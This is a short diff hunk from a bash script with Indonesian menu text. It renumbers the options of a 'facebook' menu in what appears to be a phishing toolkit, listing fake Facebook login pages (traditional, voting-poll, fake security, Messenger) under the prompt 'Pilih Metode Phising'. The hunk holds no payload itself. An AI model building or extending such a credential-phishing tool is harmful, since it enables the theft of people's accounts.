@@ -44,9 +44,9 @@ fi
 facebook(){
 printf " \n"
 printf " [1] Halaman Login Tradisional\n"
-printf " [3] Halaman Login Jajak Pendapat Pemungutan Suara\n"
-printf " [4] Halaman Login Keamanan Palsu\n"
-printf " [5] Halaman Login Facebook Messenger\n"
+printf " [2] Halaman Login Jajak Pendapat Pemungutan Suara\n"
+printf " [3] Halaman Login Keamanan Palsu\n"
+printf " [4] Halaman Login Facebook Messenger\n"
 printf "\e[0m\n"
 read -p $'Pilih Metode Phising : ' option
 if [[ $option == 1 || $option == 01 ]]; then
